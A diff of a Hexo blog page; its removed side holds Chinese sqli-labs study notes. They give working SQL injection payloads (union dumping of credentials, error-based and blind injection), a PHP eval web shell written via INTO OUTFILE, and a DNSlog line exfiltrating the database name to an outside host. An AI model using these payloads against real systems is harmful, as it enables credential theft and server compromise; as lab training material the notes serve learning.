@@ -1,831 +1,365 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="en" class="loading">
 <head>
-  <meta charset="utf-8">
-  
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/page/6/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
     
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
-
-  
-  
-<link rel="stylesheet" href="/css/style.css">
-
-  
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
     
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+    
+<link rel="stylesheet" href="/css/diaspora.css">
 
-  
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
 <meta name="generator" content="Hexo 5.4.0"></head>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div class="nav">
+    <ul id="menu-menu" class="menu">
         
-          <a class="main-nav-link" href="/">Home</a>
+        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="//" title="首页" target="_blank" rel="noopener">首页</a>
+        </li>
         
-          <a class="main-nav-link" href="/archives">Archives</a>
+        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/categories/" title="分类" target="_blank" rel="noopener">分类</a>
+        </li>
         
-      </nav>
-      <nav id="sub-nav">
+        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/tags/" title="标签" target="_blank" rel="noopener">标签</a>
+        </li>
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/archives/" title="归档" target="_blank" rel="noopener">归档</a>
+        </li>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-sqli-labs/7" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/22/sqli-labs/7/" class="article-date">
-  <time class="dt-published" datetime="2020-11-22T07:53:57.000Z" itemprop="datePublished">2020-11-22</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/about/" title="关于" target="_blank" rel="noopener">关于</a>
+        </li>
         
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/11/22/sqli-labs/7/">sqli-labs7</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="Mysql文件读写"><a href="#Mysql文件读写" class="headerlink" title="Mysql文件读写"></a>Mysql文件读写</h3><p>涉及一个配置项secure_file_priv=</p>
-<ul>
-<li>文件读取函数：<br>Load_file(‘文件路径’)</li>
-<li>写文件函数：<br>into outfile<br>into dumpfile</li>
-<li><em>两个函数区别：<br>因为into outfile函数会在行末端写入新行更致命的是会转义换行符，所以利用使用mysql写入dll或者二进制可执行文件，文件可能会被破坏。<br>into dumpfile就能导出一个完整能执行的二进制文件。</em>*<br>条件：<br>1、设置secure_file_priv为Null<br>2、绝对路径<br>3、文件不存在<br>4、有权限<br>尝试注入点，直到?id=1’))–+<br>才出现不同的回显,提示使用outfile语句<br><img src="7.md/0.png"><br>1、secure_file_priv这个参数主要用来限制数据的导入导出效果（load data, into outfile等）。<br>如果这个参数值为NULL，那么mysql会禁止用户进行导入导出操作；<br>如果这个参数是一个具体的目录名，那么数据的导入导出只能在该目录下进行；<br>如果这个参数为空，那么导入导出的文件位置将不受限制。<br>打开MySQL目录，在my-ini文件中把secure_file_priv改为空。<br>2、datadir<br>这个参数是MySql存放数据文件的目录，也是导入导出操作的相对路径。<br>去第一关查询相对路径，<br><img src="7.md/1.png"><br>注入一句话木马可以了解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/86772765">https://blog.csdn.net/weixin_39190897/article/details/86772765</a><br>接下来我们注入一句话木马到第七关的目录。<br>into outfile函数(写文件)<br>用法：select ‘写入内容’ into outfile ‘要保存的路径’<br><code>?id=-1&#39;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;&quot;into outfile &quot;D:/phpstudy_pro/WWW/sqli-labs/Less-7/text.php&quot;--+</code><br><img src="7.md/2.png">成功注入，</li>
-<li><ul>
-<li>这里需要使用\ 因为\会被当作转义字符。<br>也可以直接用/  **<br>注入成功后，这边我们用中国菜刀进行连接。</li>
-</ul>
-</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/22/sqli-labs/7/" data-id="ckr3hbgt8002r4cvo2a04fq13" data-title="sqli-labs7" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-sqli-labs/5~6" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/19/sqli-labs/5~6/" class="article-date">
-  <time class="dt-published" datetime="2020-11-19T14:06:40.000Z" itemprop="datePublished">2020-11-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+    </ul>
+	<span class="target"></span>
+	<center>
+	<div class="hitokoto">
+		<span class="typed" id="hitokoto" data-st="true"></span>
+	</div>
+	</center>
+	
+	<p class="footerlinks">
+		<a href="#" class="iconfont icon-null"></a>
+		
+            <a href="/" title="facebook" class="iconfont icon-facebook" target="_blank" rel="noopener"> </a>
         
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/11/19/sqli-labs/5~6/">sqli-labs5、6</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <ul>
-<li>导入：源码中有 print_f(mysql_error())<h3 id="报错注入型"><a href="#报错注入型" class="headerlink" title="报错注入型"></a>报错注入型</h3>  输入?id=1到17页面显示正常 大于18 页面显示异常，得出没有页面没有显示位，无法使用联合注入<br><img src="5~6.md/1.png"><br>  尝试加单引号，出现sql语句报错，使用：报错注入。<br><img src="5~6.md/2.png"></li>
-</ul>
-<h4 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h4><p><code>?id=1&#39; and (select 1 from (select count(*),concat(((查询语句)),floor(rand()*2))x from information_schema.tables group by x)a)--+</code><br>    可更改查询语句  获得其他数据,详细见双查询注入。</p>
-<h4 id="updatexml函数报错注入"><a href="#updatexml函数报错注入" class="headerlink" title="updatexml函数报错注入"></a>updatexml函数报错注入</h4><p>语法：<br><code>updatexml(文档类型,xpath路径,更新的内容)</code><br>xpath路径写入其他格式就会报错，并返回我们写入的非法格式内容。<br><code>?id=1&#39; and updatexml (1,concat(0x7c,(select database())),1)--+</code> **0x7c后面的逗号不能漏。这里id的值影响不大但是单引号不能漏，不然不会报错。<br><img src="5~6.md/3.png"></p>
-<p>补充：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">polygon函数替换updatexml</span><br><span class="line"></span><br><span class="line">select polygon((select*from(select*from*(select@@version)f)x))</span><br></pre></td></tr></table></figure>
-
-<h4 id="extractvalue函数报错注入"><a href="#extractvalue函数报错注入" class="headerlink" title="extractvalue函数报错注入"></a>extractvalue函数报错注入</h4><p>语法：<br><code>extractvalue(文档类型，xpath路径)</code><br><code>?id=1&#39; and extractvalue(1,concat(0x7c,(查询语句)))</code>,<br><img src="5~6.md/4.png">    </p>
-<h4 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h4><p><code>?id=1&#39; and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a)--+</code><br><img src="5~6.md/7.png"></p>
-<h3 id="第六关，”闭合型报错，使用报错语句注入即可。"><a href="#第六关，”闭合型报错，使用报错语句注入即可。" class="headerlink" title="第六关，”闭合型报错，使用报错语句注入即可。"></a>第六关，”闭合型报错，使用报错语句注入即可。</h3><p>*** 补充一下报错获取用户账户和秘密的代码。<br><code>?id=1&quot; and updatexml(1,concat(0x7c,(select username from users limit 0,1)),1)--+</code><br><img src="5~6.md/5.png"><br>如果直接要直接查找username,password 记得使用concat进行连接。<br><code>?id=1&quot; and updatexml(1,concat(0x7c,(select concat(username,password)from users limit 0,1)),1)--+</code><br>但是结果也只能慢慢报出，所以一个个查也是可以的，因为长度过长。<br><img src="5~6.md/6.png"></p>
-<p>对于报错注入长度限制：</p>
-<p>我们可以使用函数substr、mid、substring进行截断：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and updatexml(1,concat(0x7c,(select substr(concat(password),1,10)from &#x27;users&#x27; limit 0,1),0x7c),1)#</span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li>补充</li>
-</ul>
-<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p><strong>盲注函数ascii</strong></p>
-<p>它是通过ascii码表注入的<br>以第五关为例：<code>?id=1&#39; and ascii(substr(database(),1,1))=115--+</code>有回显，猜对了！<br>不知道ascii表我们可以在MySQL中使用<code>select char(115)</code>查询字母，是通过查询语句后的数字调节查询位置的，可以通过大于号小于号加快查询。</p>
-<p><strong>函数mid</strong></p>
-<p><code>?id=1&#39; and mid(database(),1,1)=&#39;s&#39;--+</code>回显正确<br>再猜第二个字符时，<br><code>?id=1&#39; and mid(database(),2,1)=&#39;e&#39;--+</code><br><strong>第一个参数是字符位置，第二个参数是查询长度</strong></p>
-<h4 id="总结：这两个函数比left好处是可以控制查询长度。"><a href="#总结：这两个函数比left好处是可以控制查询长度。" class="headerlink" title="总结：这两个函数比left好处是可以控制查询长度。"></a>总结：这两个函数比left好处是可以控制查询长度。</h4>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/19/sqli-labs/5~6/" data-id="ckr3hbgt7002p4cvo4gt07rda" data-title="sqli-labs5、6" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-sqli-labs/双查询注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/19/sqli-labs/%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/" class="article-date">
-  <time class="dt-published" datetime="2020-11-19T11:12:55.000Z" itemprop="datePublished">2020-11-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+            <a href="/" title="twitter" class="iconfont icon-twitter" target="_blank" rel="noopener"> </a>
         
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/11/19/sqli-labs/%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/">双查询注入</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h3><h4 id="了解floor，rand语句"><a href="#了解floor，rand语句" class="headerlink" title="了解floor，rand语句"></a>了解floor，rand语句</h4><pre><code> select concat(&#39;x&#39;,&#39;y&#39;);`可用于连接x，y得xy
-</code></pre>
-<p><strong>字符记得加单引号或者双引号闭合</strong><br><img src="%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5.md/1.png"></p>
-<pre><code>测试 `select rand()`多测试几次，可以看到，这个函数就是返回大于0，小于1之间的数。
-</code></pre>
-<p><img src="%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5.md/2.png"><br>    <code>select floor(小数)</code>取整(不会进行四舍五入)<br><img src="%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5.md/3.png"><br>    联合两者 <code>select floor(rand()*2);</code>我们从里向外看。rand() 返回大于0小于1的小数，*2为&gt;0&amp;&amp;&lt;2。然后对结果进行取整，这个查询的结果不是1，就是0。<br><img src="%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5.md/4.png"></p>
-<h4 id="加大难度-复合"><a href="#加大难度-复合" class="headerlink" title="加大难度(复合)"></a>加大难度(复合)</h4><pre><code>`select concat((select database()),floor(rand()*2));`结果不是数据名1就是数据库名2；
-</code></pre>
-<p><img src="%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5.md/5.png"><br>    再其后面加<code>from 表名</code>可得此表用户；<br>    如果是<code>from information_schema.schemata</code>可查询有几个数据库。</p>
-<h4 id="加上group-by语句"><a href="#加上group-by语句" class="headerlink" title="加上group by语句"></a>加上group by语句</h4><pre><code>可使用information_schema.tables或information_schema.columns两个表查询
-`select concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a`，//对concat((select database()),floor(rand()*2))取名为a 并分组。
-这里的database，可换成其它的查询
-</code></pre>
-<p><img src="%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5.md/6.png"></p>
-<h4 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h4><pre><code>多了一个聚合函数 count(*)    
-select count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a;结果报错，重复得结果。
-</code></pre>
-<p><img src="%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5.md/7.png"></p>
-<h4 id="派生表"><a href="#派生表" class="headerlink" title="派生表"></a>派生表</h4><pre><code>`select 1 from (table name);`这样的语句报错 具体就是：
-`(select 1 from (select count(*),concat((select database()),floor(rand()*2))x from information_schema.tables group by x)a);`
-</code></pre>
-<p><img src="%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5.md/8.png">        </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/19/sqli-labs/%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/" data-id="ckr3hbgtj003n4cvo14sodvfj" data-title="双查询注入" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-sqli-labs/sql注入学习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/17/sqli-labs/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="article-date">
-  <time class="dt-published" datetime="2020-11-17T02:25:24.000Z" itemprop="datePublished">2020-11-17</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+            <a href="/" title="github" class="iconfont icon-github" target="_blank" rel="noopener"> </a>
         
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/11/17/sqli-labs/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">MYSQL注入相关学习</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="与MySQL相关知识点"><a href="#与MySQL相关知识点" class="headerlink" title="与MySQL相关知识点"></a>与MySQL相关知识点</h3><pre><code>MySQL默认存放一个“information_schema”的数据库
-记住三个表名“schemata、tables、columns”
-schemata表储存该用户创建所有数据库的库名，记住schema_name（数据库库名的字段名）。
-tables表储存该用户创建所有数据库的库名和表名，记住table_schema(数据库库名)和table_name(表名的字段名)
-colunms表储存该用户所有数据库的库名、表名、字段名 记住table_schema(数据库库名)、table_name（表名）、column_name（字段名的字段名）。
-</code></pre>
-<h4 id="1、MySQL查询语句"><a href="#1、MySQL查询语句" class="headerlink" title="1、MySQL查询语句"></a>1、MySQL查询语句</h4><pre><code>select 要查询的字段名 from 库名.表名
-select 要查询的字段名 from 库名.表名 where 已知条件字段名=&#39;已知条件的值&#39;
-知道两个条件时，用and连接。
-</code></pre>
-<h4 id="2、limit-用法"><a href="#2、limit-用法" class="headerlink" title="2、limit 用法"></a>2、limit 用法</h4><pre><code>limit m,n m表示记录开始，0开始为第一条；n指取n条记录。
-</code></pre>
-<h4 id="3、需要记住几个函数"><a href="#3、需要记住几个函数" class="headerlink" title="3、需要记住几个函数"></a>3、需要记住几个函数</h4><pre><code>database():当前网站使用的数据库
-version():当前MySQL版本
-user():当前MySQL用户
-</code></pre>
-<h4 id="4、注释符"><a href="#4、注释符" class="headerlink" title="4、注释符"></a>4、注释符</h4><pre><code>#或--空格或/*/。
-</code></pre>
-<h4 id="5、-内联注释-代码-。"><a href="#5、-内联注释-代码-。" class="headerlink" title="5、 内联注释/!代码/。"></a>5、 内联注释/<em>!代码</em>/。</h4><h3 id="union-注入攻击"><a href="#union-注入攻击" class="headerlink" title="union 注入攻击"></a>union 注入攻击</h3><p>使用联合查询注入 sql1 union sql2 字段数要一致，不然会报错。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/17/sqli-labs/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" data-id="ckr3hbgti003l4cvo26kg8g25" data-title="MYSQL注入相关学习" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-sqli-labs/1~4" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/12/sqli-labs/1~4/" class="article-date">
-  <time class="dt-published" datetime="2020-11-12T13:55:54.000Z" itemprop="datePublished">2020-11-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+            <a href="/img/logo.png" title="wechat" class="iconfont icon-wechat" target="_blank" rel="noopener"> </a>
         
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/11/12/sqli-labs/1~4/">sqli-labs1</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><h5 id="首先判断注入点的类型"><a href="#首先判断注入点的类型" class="headerlink" title="首先判断注入点的类型"></a>首先判断注入点的类型</h5><p>只有单引号出现报错，单引号为注入点。<br><code>?id=1&#39;</code><br><img src="1~4.md/1.png"></p>
-<h5 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h5><p><code>?id=1&#39;order by 4--+</code>(多次猜测可得出有3列)</p>
-<h4 id="将1改成不存在数据库的，得出2，3列有回显。"><a href="#将1改成不存在数据库的，得出2，3列有回显。" class="headerlink" title="将1改成不存在数据库的，得出2，3列有回显。"></a>将1改成不存在数据库的，得出2，3列有回显。</h4><p><code>?id=-1&#39; union select 1,2,3--+</code><br><img src="1~4.md/2.png"></p>
-<h4 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h4><p><code>?id=-1&#39; union select 1,2,database()--+</code> 得出security。<br><img src="1~4.md/3.png"></p>
-<h4 id="爆数据表"><a href="#爆数据表" class="headerlink" title="爆数据表"></a>爆数据表</h4><p><code>?id=-1&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;--+</code><br><img src="1~4.md/4.png"></p>
-<h4 id="爆user表的列"><a href="#爆user表的列" class="headerlink" title="爆user表的列"></a>爆user表的列</h4><p><code>?id=-1&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39;--+</code><br><img src="1~4.md/5.png"></p>
-<h4 id="爆用户名和密码"><a href="#爆用户名和密码" class="headerlink" title="爆用户名和密码"></a>爆用户名和密码</h4><p><code>?id=-1&#39; union select 1,2,group_concat(username,&#39;-&#39;,password) from users --+</code><br><img src="1~4.md/6.png"></p>
-<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>判断类型：为数字注入型。将id=1改成id=-1即可，改成一个不存在数据库的即可。</p>
-<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><h4 id="字符型注入。"><a href="#字符型注入。" class="headerlink" title="字符型注入。"></a>字符型注入。</h4><h5 id="判断类型：只有输入”回显正常，为注入点。"><a href="#判断类型：只有输入”回显正常，为注入点。" class="headerlink" title="判断类型：只有输入”回显正常，为注入点。"></a><strong>判断类型：只有输入”回显正常，为注入点。</strong></h5><p>说明此处为字符型注入，且是以(‘’)的方式闭合字符串的；这里的’   ‘ 不是”  “ 。</p>
-<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>改成”)即可。</p>
-<h3 id="—补充使用dnslog注入方法："><a href="#—补充使用dnslog注入方法：" class="headerlink" title="—补充使用dnslog注入方法："></a>—补充使用dnslog注入方法：</h3><p>使用网址<a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a><br>输入：<br><code>?id=1&#39; and (select load_file(concat(&#39;////&#39;,database(),&#39;.qcmie7.dnslog.cn/abc&#39;)))--+</code></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/12/sqli-labs/1~4/" data-id="ckr3hbgsw00274cvo3o4n7l4l" data-title="sqli-labs1" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-sqli-labs/mysql3" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/11/sqli-labs/mysql3/" class="article-date">
-  <time class="dt-published" datetime="2020-11-11T13:55:31.000Z" itemprop="datePublished">2020-11-11</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+            <a href="mailto:xxxx@gmail.com" title="email" class="iconfont icon-email" target="_blank" rel="noopener"> </a>
         
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/11/11/sqli-labs/mysql3/">mysql3</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="mysql插入数据"><a href="#mysql插入数据" class="headerlink" title="mysql插入数据"></a>mysql插入数据</h2><p><code>insert into 表名(名称1，-，-)</code><br><code>values</code><br><code>(插入的数据);</code></p>
-<h2 id="mysql读取数据"><a href="#mysql读取数据" class="headerlink" title="mysql读取数据"></a>mysql读取数据</h2><p><code>select * from 数据表名</code><br>或<code>select 表中字段名 from 表名</code></p>
-<h2 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h2><p><code>update 表名 set 名称=新数据;</code></p>
-<h2 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h2><p><code>delete from 表名 where 名称=数据;</code></p>
-<h2 id="like-子句"><a href="#like-子句" class="headerlink" title="like 子句"></a>like 子句</h2><pre><code>select 表中字段名 from where 表中字段名 like 数据；
-like 相当于 =
-可用and或者or指定一个或多个
-可在delete或update命令中使用where like 子句来指定条件 一定要和where连用eg`update from 表名 set 表中字段名=新数据 where 表中字段名 like 旧数据； `
-</code></pre>
-<h2 id="union操作符"><a href="#union操作符" class="headerlink" title="union操作符"></a>union操作符</h2><pre><code>用于连接两个以上的select语句的结果组合集合中。多个select语句会删除重复的数据。
-eg：`select 表中字段名1 from 表名1 union select 表中字段名2 from 表名2`
-可以用多个union连接
-</code></pre>
-<h2 id="MySQL排序"><a href="#MySQL排序" class="headerlink" title="MySQL排序"></a>MySQL排序</h2><pre><code>order by asc(升序) desc（降序）默认升序
-select * from 表名 order by 表中字段名 asc；
-</code></pre>
-<h2 id="MySQL分组"><a href="#MySQL分组" class="headerlink" title="MySQL分组"></a>MySQL分组</h2><pre><code>group by 语句    
-eg：select 表中字段名 ，count(*)from表名 group by 表中字段名
-***count(*)不能分开，逗号不能漏，count为函数，我们还可以使用sum，avg等函数。
-</code></pre>
-<h2 id="MySQL-使用with-rollup"><a href="#MySQL-使用with-rollup" class="headerlink" title="MySQL 使用with rollup"></a>MySQL 使用with rollup</h2><pre><code>实现分组求和
-`select 表中字段名，sum表中字段名as任意你想要的名称 from 表名 group by 表中字段名 with rollup；`
-null记录总数，可用`select coalesce (表中字段名，&#39;任意你想要的名称&#39;)，sum(表中字段名)as 任意你想要的名称 同上;`
-同样不要漏逗号了；
-</code></pre>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/11/sqli-labs/mysql3/" data-id="ckr3hbgth003h4cvo0mkbg3gk" data-title="mysql3" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-PHP2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/10/PHP2/" class="article-date">
-  <time class="dt-published" datetime="2020-11-10T12:49:28.000Z" itemprop="datePublished">2020-11-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/11/10/PHP2/">PHP2</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>for （初始值；条件；增量）<br>{要执行的代码<br>}<br>eg：1+2+。。+100值<br><code>for （$i=0;$i&lt;=100;$i++）</code><br><code>&#123;$sum+=$i; </code><br><code>&#125;echo &quot;$sum&quot;</code></p>
-<h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p><code>while (条件)</code><br><code>&#123;要执行的代码;&#125;</code>
+		<a href="#" class="iconfont icon-null"></a>
+	</p>
+	
+    <p id="copyright">
+        &copy; 2021 John Doe.
+        <span> | </span>Powered by <a href="https://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        <span> | </span>Theme <a href="https://github.com/Fechin/hexo-theme-diaspora" title="Diaspora" target="_blank" rel="noopener">Diaspora</a> by Fechin
+		
+		<span> | </span><a rel="nofollow" href="http://www.beian.miit.gov.cn" target="_blank">冀ICP备xxxxxxx号</a>
+		
     </p>
+</div>
 
-      
+<div id="container">
+    
+<div id="screen">
+    <div id="mark">
